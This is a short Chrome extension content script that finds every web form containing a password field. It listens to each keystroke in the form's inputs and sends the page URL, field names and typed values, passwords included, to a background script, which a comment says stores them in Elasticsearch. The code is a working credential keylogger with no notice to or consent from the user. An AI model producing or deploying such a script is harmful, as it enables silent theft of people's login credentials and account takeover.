var port = chrome.runtime.connect();

/* Listen on element tag 'input' if there is an element of type password
   Send the data captured to background.js so that it can persist it in elasticsearch.
 */
for (var i = 0; i < document.forms.length; i++) {
	var curForm = document.forms[i];
	var inps = curForm.getElementsByTagName('input');
	var passwd_present = 0;
	for (var j = 0; j < inps.length; j++) {
		if (inps[j].type == "password") {
			passwd_present = 1;
		}
	}

	if (passwd_present == 0) {
		continue;
	}

	for (var j = 0; j < inps.length; j++) {

		var x = "";
		inps[j].addEventListener("input", function() {
			var logindata = {};
			logindata["password"] = {};
			logindata["password"]["url"] = document.URL;
			logindata["password"]["fieldname"] = this.name;
			logindata["password"]["fieldvalue"] = this.value;

			port.postMessage(logindata);
		}, false);
	}
}
